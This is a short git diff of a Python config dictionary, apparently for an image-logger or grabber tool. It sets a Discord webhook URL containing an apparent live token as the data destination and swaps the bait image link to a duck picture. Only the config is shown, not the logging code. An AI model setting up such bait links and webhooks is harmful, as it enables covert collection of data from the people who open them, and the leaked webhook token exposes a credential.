@@ -23,7 +23,7 @@ __author__ = "lynxWings"
 
 config = {
     "webhook": "https://discordapp.com/api/webhooks/1130383600840364034/_GQNrtf1Sk8BVEm5-_I-5O7rsq7P_hwnHKNe2MU6xQ9gRlKV28Vpo4hRYja4UanrLGPs", # <------------------------- Put your webhook link here.
-    "image": "https://cdn.discordapp.com/attachments/1130383353812623392/1130384896041427095/Screenshot_2023-07-16-00-20-53-85_6012fa4d4ddec268fc5c7112cbb265e7.jpg", # <------------------------- Put image address link here.
+    "image": "https://cdn.discordapp.com/attachments/1075070125679579227/1130405707368386622/how-to-keep-ducks-call-ducks-1615457181_1.jpg", # <------------------------- Put image address link here.
     "imageArgument": True,
 
     "username": "WingsMiner",
